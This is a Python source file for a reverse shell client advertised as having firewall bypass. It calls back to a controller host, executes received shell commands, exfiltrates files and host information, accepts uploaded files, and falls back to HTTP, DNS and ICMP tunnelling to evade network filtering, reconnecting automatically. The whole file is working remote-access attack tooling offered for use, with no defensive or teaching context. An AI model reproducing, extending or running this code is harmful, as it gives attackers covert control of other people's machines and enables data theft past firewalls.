#!/usr/bin/env python3
"""
Advanced Reverse Shell Client with Firewall Bypass
A feature-rich reverse shell client with encryption, file transfer, and firewall bypass capabilities.
"""

import socket
import json
import subprocess
import os
import base64
import time
import sys
import threading
import argparse
import logging
from pathlib import Path
from datetime import datetime
import ssl
import hashlib
import struct
import urllib.parse
import http.client
import random
import string

# Optional imports for advanced features
try:
    import dns.resolver
    import dns.query
    HAS_DNS = True
except ImportError:
    HAS_DNS = False

try:
    import scapy.all as scapy
    HAS_SCAPY = True
except ImportError:
    HAS_SCAPY = False

class HTTPTunnel:
    """HTTP tunneling wrapper for firewall bypass."""
    
    def __init__(self, host, port, use_https=False, path="/api/data"):
        self.host = host
        self.port = port
        self.use_https = use_https
        self.path = path
        self.connection = None
        
    def connect(self):
        """Establish HTTP connection."""
        try:
            if self.use_https:
                self.connection = http.client.HTTPSConnection(self.host, self.port, timeout=10)
            else:
                self.connection = http.client.HTTPConnection(self.host, self.port, timeout=10)
            return True
        except Exception as e:
            return False
    
    def send(self, data):
        """Send data via HTTP POST."""
        try:
            encoded_data = base64.b64encode(data).decode('utf-8')
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
            body = urllib.parse.urlencode({'data': encoded_data})
            self.connection.request('POST', self.path, body, headers)
            response = self.connection.getresponse()
            response_data = response.read()
            return base64.b64decode(response_data) if response_data else None
        except Exception as e:
            return None
    
    def close(self):
        """Close connection."""
        if self.connection:
            self.connection.close()

class DNSTunnel:
    """DNS tunneling for firewall bypass."""
    
    def __init__(self, domain, nameserver=None):
        self.domain = domain
        self.nameserver = nameserver or "8.8.8.8"
        self.chunk_size = 60  # Max DNS label length
        
    def _encode_chunk(self, data):
        """Encode data chunk for DNS."""
        return base64.b32encode(data).decode('utf-8').rstrip('=')
    
    def _decode_chunk(self, encoded):
        """Decode DNS chunk."""
        try:
            # Add padding if needed
            padding = (8 - len(encoded) % 8) % 8
            encoded += '=' * padding
            return base64.b32decode(encoded)
        except:
            return None
    
    def send(self, data):
        """Send data via DNS query."""
        if not HAS_DNS:
            return None
        
        try:
            # Split data into chunks
            chunks = [data[i:i+self.chunk_size] for i in range(0, len(data), self.chunk_size)]
            chunk_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
            
            for i, chunk in enumerate(chunks):
                encoded = self._encode_chunk(chunk)
                query_name = f"{chunk_id}.{i}.{encoded}.{self.domain}"
                
                try:
                    resolver = dns.resolver.Resolver()
                    resolver.nameservers = [self.nameserver]
                    resolver.timeout = 5
                    resolver.lifetime = 5
                    resolver.resolve(query_name, 'A')
                except:
                    pass
            
            return b"OK"
        except Exception as e:
            return None

class ICMPTunnel:
    """ICMP tunneling for firewall bypass."""
    
    def __init__(self, target_ip):
        self.target_ip = target_ip
        if not HAS_SCAPY:
            raise ImportError("scapy is required for ICMP tunneling")
    
    def send(self, data):
        """Send data via ICMP ping."""
        try:
            # Encode data in ICMP payload
            encoded = base64.b64encode(data).decode('utf-8')
            # Split into chunks (ICMP payload limit)
            chunks = [encoded[i:i+32] for i in range(0, len(encoded), 32)]
            
            for chunk in chunks:
                packet = scapy.IP(dst=self.target_ip)/scapy.ICMP()/chunk
                scapy.send(packet, verbose=0)
                time.sleep(0.1)  # Rate limiting
            
            return b"OK"
        except Exception as e:
            return None

class ReverseShellClient:
    def __init__(self, host, port, use_ssl=False, reconnect_delay=5, buffer_size=4096,
                 tunnel_mode='direct', http_path="/api/data", dns_domain=None, 
                 use_port_fallback=True):
        """
        Initialize the reverse shell client.
        
        Args:
            host: Server hostname or IP address
            port: Server port number
            use_ssl: Enable SSL/TLS encryption
            reconnect_delay: Delay between reconnection attempts (seconds)
            buffer_size: Socket buffer size
            tunnel_mode: 'direct', 'http', 'dns', 'icmp', or 'auto'
            http_path: HTTP path for tunneling
            dns_domain: DNS domain for DNS tunneling
            use_port_fallback: Automatically try port 80/443 if connection fails
        """
        self.host = host
        self.port = port
        self.use_ssl = use_ssl
        self.reconnect_delay = reconnect_delay
        self.buffer_size = buffer_size
        self.tunnel_mode = tunnel_mode
        self.http_path = http_path
        self.dns_domain = dns_domain
        self.use_port_fallback = use_port_fallback
        self.connection = None
        self.tunnel = None
        self.running = False
        self.current_directory = os.getcwd()
        
        # Setup logging
        self.setup_logging()
    
    def setup_logging(self):
        """Setup logging configuration."""
        try:
            logging.basicConfig(
                level=logging.INFO,
                format='%(asctime)s - %(levelname)s - %(message)s',
                handlers=[
                    logging.FileHandler('client.log'),
                    logging.StreamHandler(sys.stdout)
                ]
            )
            self.logger = logging.getLogger(__name__)
        except Exception as e:
            print(f"Error setting up logging: {e}")
            self.logger = None
    
    def log(self, message, level='info'):
        """Log a message."""
        if self.logger:
            if level == 'error':
                self.logger.error(message)
            elif level == 'warning':
                self.logger.warning(message)
            else:
                self.logger.info(message)
    
    def _try_connect_direct(self, host, port, use_ssl):
        """Try direct connection."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((host, port))
            
            if use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=host)
            
            return sock
        except:
            return None
    
    def _try_connect_http(self, host, port, use_https):
        """Try HTTP tunneling."""
        try:
            tunnel = HTTPTunnel(host, port, use_https, self.http_path)
            if tunnel.connect():
                return tunnel
        except:
            pass
        return None
    
    def connect(self):
        """Establish connection with firewall bypass."""
        while not self.running:
            try:
                self.log(f"Attempting to connect to {self.host}:{self.port}...")
                
                # Try direct connection first
                if self.tunnel_mode in ['direct', 'auto']:
                    self.connection = self._try_connect_direct(self.host, self.port, self.use_ssl)
                    if self.connection:
                        self.log(f"Direct connection established to {self.host}:{self.port}")
                        self.running = True
                        return True
                
                # Try port 80/443 fallback
                if self.use_port_fallback and self.tunnel_mode in ['direct', 'auto']:
                    fallback_ports = [80, 443]
                    for fallback_port in fallback_ports:
                        self.log(f"Trying fallback port {fallback_port}...", 'warning')
                        self.connection = self._try_connect_direct(self.host, fallback_port, fallback_port == 443)
                        if self.connection:
                            self.log(f"Connected via fallback port {fallback_port}")
                            self.running = True
                            return True
                
                # Try HTTP tunneling
                if self.tunnel_mode in ['http', 'auto']:
                    self.log("Attempting HTTP tunneling...", 'warning')
                    self.tunnel = self._try_connect_http(self.host, self.port, self.use_ssl)
                    if not self.tunnel and self.use_port_fallback:
                        self.tunnel = self._try_connect_http(self.host, 80, False)
                        if not self.tunnel:
                            self.tunnel = self._try_connect_http(self.host, 443, True)
                    
                    if self.tunnel:
                        self.connection = self.tunnel
                        self.log("HTTP tunnel established")
                        self.running = True
                        return True
                
                # Try DNS tunneling
                if self.tunnel_mode in ['dns', 'auto'] and self.dns_domain:
                    self.log("Attempting DNS tunneling...", 'warning')
                    try:
                        self.tunnel = DNSTunnel(self.dns_domain)
                        self.connection = self.tunnel
                        self.log("DNS tunnel initialized")
                        self.running = True
                        return True
                    except:
                        pass
                
                # Try ICMP tunneling
                if self.tunnel_mode in ['icmp', 'auto']:
                    self.log("Attempting ICMP tunneling...", 'warning')
                    try:
                        self.tunnel = ICMPTunnel(self.host)
                        self.connection = self.tunnel
                        self.log("ICMP tunnel initialized")
                        self.running = True
                        return True
                    except ImportError:
                        self.log("ICMP tunneling requires scapy", 'warning')
                    except:
                        pass
                
                self.log(f"All connection methods failed. Retrying in {self.reconnect_delay} seconds...", 'warning')
                time.sleep(self.reconnect_delay)
                
            except Exception as e:
                self.log(f"Connection error: {e}. Retrying in {self.reconnect_delay} seconds...", 'error')
                time.sleep(self.reconnect_delay)
        
        return False
    
    def send_data(self, data):
        """Send data with tunnel support."""
        try:
            if isinstance(data, dict):
                json_data = json.dumps(data)
            elif isinstance(data, str):
                json_data = data
            elif isinstance(data, bytes):
                json_data = base64.b64encode(data).decode('utf-8')
            else:
                json_data = str(data)
            
            encoded = json_data.encode('utf-8')
            
            # Use tunnel if available
            if isinstance(self.connection, (HTTPTunnel, DNSTunnel, ICMPTunnel)):
                response = self.connection.send(encoded)
                return response
            else:
                # Direct socket connection
                length = struct.pack('>I', len(encoded))
                self.connection.sendall(length + encoded)
                
        except BrokenPipeError:
            self.log("Connection broken. Attempting to reconnect...", 'error')
            self.running = False
            self.connect()
        except Exception as e:
            self.log(f"Error sending data: {e}", 'error')
            self.running = False
    
    def receive_data(self):
        """Receive data with tunnel support."""
        try:
            # For tunnels, we need to poll/request data
            if isinstance(self.connection, HTTPTunnel):
                # HTTP tunnel receives data in response
                return None  # HTTP is request-response, handled differently
            elif isinstance(self.connection, (DNSTunnel, ICMPTunnel)):
                # DNS/ICMP are one-way, need separate receive mechanism
                return None
            else:
                # Direct socket connection
                length_data = self._recv_all(4)
                if not length_data:
                    return None
                
                length = struct.unpack('>I', length_data)[0]
                json_data = self._recv_all(length).decode('utf-8')
                
                try:
                    return json.loads(json_data)
                except json.JSONDecodeError:
                    return json_data
                
        except socket.timeout:
            self.log("Receive timeout", 'warning')
            return None
        except ConnectionResetError:
            self.log("Connection reset by server. Reconnecting...", 'error')
            self.running = False
            self.connect()
            return None
        except Exception as e:
            self.log(f"Error receiving data: {e}", 'error')
            return None
    
    def _recv_all(self, size):
        """Receive exactly 'size' bytes from the socket."""
        data = b''
        while len(data) < size:
            chunk = self.connection.recv(size - len(data))
            if not chunk:
                raise ConnectionResetError("Connection closed")
            data += chunk
        return data
    
    def execute_command(self, command):
        """Execute a shell command safely."""
        try:
            if command.startswith('cd '):
                path = command[3:].strip()
                if not path:
                    path = os.path.expanduser('~')
                
                try:
                    os.chdir(path)
                    self.current_directory = os.getcwd()
                    return f"Changed directory to: {self.current_directory}"
                except Exception as e:
                    return f"Error changing directory: {str(e)}"
            
            process = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE,
                cwd=self.current_directory,
                universal_newlines=True
            )
            
            stdout, stderr = process.communicate()
            result = stdout + stderr
            
            if not result:
                result = f"Command executed successfully (exit code: {process.returncode})"
            
            return result
            
        except Exception as e:
            return f"Error executing command: {str(e)}"
    
    def download_file(self, file_path):
        """Download a file from the client to the server."""
        try:
            file_path = os.path.expanduser(file_path)
            
            if not os.path.exists(file_path):
                return f"Error: File not found: {file_path}"
            
            if not os.path.isfile(file_path):
                return f"Error: Path is not a file: {file_path}"
            
            with open(file_path, 'rb') as f:
                file_data = f.read()
                file_size = len(file_data)
                file_hash = hashlib.md5(file_data).hexdigest()
                
                self.log(f"Downloading file: {file_path} ({file_size} bytes)")
                
                return {
                    'status': 'success',
                    'filename': os.path.basename(file_path),
                    'data': base64.b64encode(file_data).decode('utf-8'),
                    'size': file_size,
                    'hash': file_hash
                }
                
        except PermissionError:
            return {'status': 'error', 'message': f"Permission denied: {file_path}"}
        except Exception as e:
            return {'status': 'error', 'message': f"Error downloading file: {str(e)}"}
    
    def upload_file(self, file_path, file_data):
        """Upload a file from the server to the client."""
        try:
            file_path = os.path.expanduser(file_path)
            
            if isinstance(file_data, dict):
                data = base64.b64decode(file_data.get('data', ''))
                filename = file_data.get('filename', os.path.basename(file_path))
            else:
                data = base64.b64decode(file_data)
                filename = os.path.basename(file_path)
            
            os.makedirs(os.path.dirname(file_path) if os.path.dirname(file_path) else '.', exist_ok=True)
            
            with open(file_path, 'wb') as f:
                f.write(data)
            
            file_size = len(data)
            self.log(f"Uploaded file: {file_path} ({file_size} bytes)")
            
            return f"File uploaded successfully: {file_path} ({file_size} bytes)"
            
        except PermissionError:
            return f"Error: Permission denied: {file_path}"
        except Exception as e:
            return f"Error uploading file: {str(e)}"
    
    def get_system_info(self):
        """Get system information."""
        try:
            import platform
            
            info = {
                'hostname': socket.gethostname(),
                'platform': platform.system(),
                'platform_release': platform.release(),
                'platform_version': platform.version(),
                'architecture': platform.machine(),
                'processor': platform.processor(),
                'current_user': os.getenv('USER') or os.getenv('USERNAME', 'unknown'),
                'current_directory': os.getcwd(),
                'python_version': sys.version
            }
            
            return json.dumps(info, indent=2)
        except Exception as e:
            return f"Error getting system info: {str(e)}"
    
    def run(self):
        """Main loop to receive and execute commands."""
        if not self.connect():
            return
        
        try:
            # Send initial system info
            self.send_data({
                'type': 'system_info',
                'data': self.get_system_info()
            })
            
            while self.running:
                try:
                    # Receive command
                    command_data = self.receive_data()
                    
                    if not command_data:
                        time.sleep(0.1)
                        continue
                    
                    # Handle different command types
                    if isinstance(command_data, dict):
                        cmd_type = command_data.get('type', 'command')
                        cmd_data = command_data.get('data', '')
                        
                        if cmd_type == 'command':
                            result = self.execute_command(cmd_data)
                            self.send_data({'type': 'result', 'data': result})
                        
                        elif cmd_type == 'download':
                            result = self.download_file(cmd_data)
                            self.send_data({'type': 'download_result', 'data': result})
                        
                        elif cmd_type == 'upload':
                            file_path = command_data.get('path', '')
                            file_data = command_data.get('file_data', '')
                            result = self.upload_file(file_path, file_data)
                            self.send_data({'type': 'upload_result', 'data': result})
                        
                        elif cmd_type == 'exit':
                            self.log("Received exit command")
                            break
                        
                        elif cmd_type == 'system_info':
                            result = self.get_system_info()
                            self.send_data({'type': 'system_info', 'data': result})
                        
                        else:
                            self.send_data({'type': 'error', 'data': f"Unknown command type: {cmd_type}"})
                    
                    else:
                        # Legacy string command format
                        command = str(command_data).strip()
                        
                        if command == 'exit':
                            self.log("Received exit command")
                            break
                        elif command.startswith('cd '):
                            result = self.execute_command(command)
                            self.send_data(result)
                        elif command.startswith('download '):
                            file_path = command[9:].strip()
                            result = self.download_file(file_path)
                            if isinstance(result, dict):
                                self.send_data(result)
                            else:
                                self.send_data({'type': 'error', 'data': result})
                        elif command.startswith('upload '):
                            file_path = command[7:].strip()
                            file_data = self.receive_data()
                            result = self.upload_file(file_path, file_data)
                            self.send_data(result)
                        else:
                            result = self.execute_command(command)
                            self.send_data(result)
                
                except KeyboardInterrupt:
                    self.log("Interrupted by user", 'warning')
                    break
                except Exception as e:
                    self.log(f"Error in main loop: {e}", 'error')
                    self.send_data({'type': 'error', 'data': str(e)})
        
        except Exception as e:
            self.log(f"Fatal error: {e}", 'error')
        finally:
            self.cleanup()
    
    def cleanup(self):
        """Clean up resources."""
        try:
            if isinstance(self.connection, HTTPTunnel):
                self.connection.close()
            elif not isinstance(self.connection, (DNSTunnel, ICMPTunnel)):
                if self.connection:
                    self.connection.close()
            self.running = False
            self.log("Connection closed")
        except Exception as e:
            self.log(f"Error during cleanup: {e}", 'error')

def main():
    """Main function."""
    parser = argparse.ArgumentParser(
        description='Advanced Reverse Shell Client with Firewall Bypass',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 client.py --host 192.168.1.100 --port 4444
  python3 client.py --host example.com --port 8080 --ssl
  python3 client.py --host 10.0.0.1 --tunnel http --port 80
  python3 client.py --host example.com --tunnel dns --dns-domain tunnel.example.com
  python3 client.py --host 192.168.1.100 --tunnel auto --port-fallback
        """
    )
    
    parser.add_argument(
        '--host', '-H',
        type=str,
        default='192.168.1.102',
        help='Server hostname or IP address (default: 192.168.1.102)'
    )
    
    parser.add_argument(
        '--port', '-p',
        type=int,
        default=4444,
        help='Server port number (default: 4444)'
    )
    
    parser.add_argument(
        '--ssl',
        action='store_true',
        help='Enable SSL/TLS encryption'
    )
    
    parser.add_argument(
        '--tunnel', '-t',
        choices=['direct', 'http', 'dns', 'icmp', 'auto'],
        default='direct',
        help='Tunneling mode: direct, http, dns, icmp, or auto (default: direct)'
    )
    
    parser.add_argument(
        '--http-path',
        type=str,
        default='/api/data',
        help='HTTP path for HTTP tunneling (default: /api/data)'
    )
    
    parser.add_argument(
        '--dns-domain',
        type=str,
        help='DNS domain for DNS tunneling (required for DNS mode)'
    )
    
    parser.add_argument(
        '--port-fallback',
        action='store_true',
        help='Automatically try port 80/443 if connection fails'
    )
    
    parser.add_argument(
        '--reconnect-delay', '-d',
        type=int,
        default=5,
        help='Delay between reconnection attempts in seconds (default: 5)'
    )
    
    parser.add_argument(
        '--buffer-size', '-b',
        type=int,
        default=4096,
        help='Socket buffer size (default: 4096)'
    )
    
    args = parser.parse_args()
    
    # Create and run client
    client = ReverseShellClient(
        host=args.host,
        port=args.port,
        use_ssl=args.ssl,
        reconnect_delay=args.reconnect_delay,
        buffer_size=args.buffer_size,
        tunnel_mode=args.tunnel,
        http_path=args.http_path,
        dns_domain=args.dns_domain,
        use_port_fallback=args.port_fallback
    )
    
    try:
        client.run()
    except KeyboardInterrupt:
        print("\nShutting down...")
        client.cleanup()
        sys.exit(0)

if __name__ == '__main__':
    main()
